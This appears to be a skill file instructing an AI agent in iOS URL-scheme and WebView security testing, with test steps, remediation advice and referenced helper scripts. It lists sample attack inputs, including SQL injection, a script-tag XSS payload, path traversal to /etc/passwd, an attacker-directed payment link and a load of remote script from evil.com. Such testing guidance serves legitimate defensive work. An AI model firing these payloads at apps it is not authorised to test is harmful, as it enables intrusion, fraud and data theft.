---
name: ios-protocol-handlers
description: iOS WebView Protocol Handler security testing. Use this skill whenever the user mentions iOS app security, URL schemes, custom protocol handlers, deep links, intent hijacking, or WebView vulnerabilities. This skill helps enumerate, test, and exploit iOS protocol handler vulnerabilities including URL scheme hijacking, deep link injection, and data exfiltration through custom schemes.
---

# iOS WebView Protocol Handler Security Testing

This skill provides a systematic approach to testing iOS WebView protocol handlers for security vulnerabilities. Protocol handlers (URL schemes) are a common attack surface in iOS applications.

## What are Protocol Handlers?

iOS apps can register custom URL schemes (e.g., `myapp://`) that allow other apps to open them with specific parameters. These are commonly used for:
- Deep linking to specific app screens
- OAuth callbacks
- Payment processing
- Social sharing
- Cross-app communication

## Common Vulnerabilities

1. **URL Scheme Hijacking** - Registering the same scheme to intercept traffic
2. **Deep Link Injection** - Crafting malicious URLs to trigger unintended actions
3. **Parameter Tampering** - Modifying URL parameters to bypass validation
4. **Data Exfiltration** - Extracting sensitive data via protocol handlers
5. **Intent Hijacking** - Triggering unintended app behaviors

## Testing Workflow

### Step 1: Enumerate Protocol Handlers

First, identify what protocol handlers the target app uses:

```bash
# Check app's Info.plist for registered schemes
# Look for CFBundleURLTypes array

# Use mobile device or simulator to inspect
# Check for common patterns: appname://, appname+oauth://, etc.
```

### Step 2: Analyze Handler Behavior

Test how the app responds to different URL patterns:

```bash
# Basic scheme test
open myapp://

# With path
open myapp://home

# With parameters
open myapp://user?id=123

# With query string
open myapp://action?param=value&other=test
```

### Step 3: Test for Vulnerabilities

#### Parameter Injection

Test if parameters are properly validated:

```bash
# SQL injection style
open myapp://user?id=1' OR '1'='1

# XSS style (if rendered in WebView)
open myapp://profile?name=<script>alert(1)</script>

# Path traversal
open myapp://files?path=../../../etc/passwd
```

#### Deep Link Manipulation

Test if deep links can trigger unintended actions:

```bash
# Try to access admin screens
open myapp://admin/settings

# Try to trigger payments
open myapp://payment?amount=0.01&recipient=attacker

# Try to bypass authentication
open myapp://dashboard?auth=bypass
```

#### Data Exfiltration

Check if sensitive data can be extracted:

```bash
# Check if data is returned in URL
open myapp://callback

# Check if data is passed to other apps
open myapp://share?data=sensitive_info
```

### Step 4: Test WebView-Specific Issues

If the app uses WebViews:

```bash
# Test JavaScript injection
open myapp://web?url=https://evil.com/malicious.js

# Test file:// protocol access
open myapp://web?url=file:///private/data

# Test local file inclusion
open myapp://web?file=local.html
```

## Automated Testing Scripts

Use the bundled scripts to automate common tests:

### enumerate_schemes.sh
Enumerates common protocol handler patterns for a given app name.

### test_handler.sh
Tests a specific protocol handler with various payloads.

### check_hijack.sh
Checks if a protocol handler can be hijacked.

## Reporting Findings

When documenting vulnerabilities:

1. **Vulnerability Type** - Clear classification
2. **Affected Handler** - The specific URL scheme
3. **Payload** - The malicious URL used
4. **Impact** - What the attacker can achieve
5. **Remediation** - How to fix the issue

## Remediation Guidelines

### For Developers

1. **Validate all parameters** - Never trust URL parameters
2. **Use allowlists** - Only accept expected values
3. **Implement authentication** - Require auth for sensitive actions
4. **Sanitize inputs** - Prevent injection attacks
5. **Use secure schemes** - Consider using Universal Links instead

### For Security Teams

1. **Regular testing** - Include protocol handlers in security assessments
2. **Code review** - Check handler implementations
3. **Runtime protection** - Consider using security frameworks
4. **Monitoring** - Watch for unusual handler usage

## References

- [OWASP Mobile Security Testing Guide](https://owasp.org/www-project-mobile-security-testing-guide/)
- [iOS URL Scheme Security](https://developer.apple.com/documentation/uikit/url_loading_and_navigation)
- [Universal Links Security](https://developer.apple.com/documentation/xcode/configuring-universal-links)

## Quick Start

```bash
# 1. Enumerate handlers for an app
./scripts/enumerate_schemes.sh myapp

# 2. Test a specific handler
./scripts/test_handler.sh "myapp://action?param=value"

# 3. Check for hijacking
./scripts/check_hijack.sh "myapp://"
```

## Notes

- Always test on a device or simulator, not just in theory
- Some handlers may require the app to be installed
- Test both iOS and iPadOS if applicable
- Consider testing on different iOS versions
- Document all findings with screenshots when possible
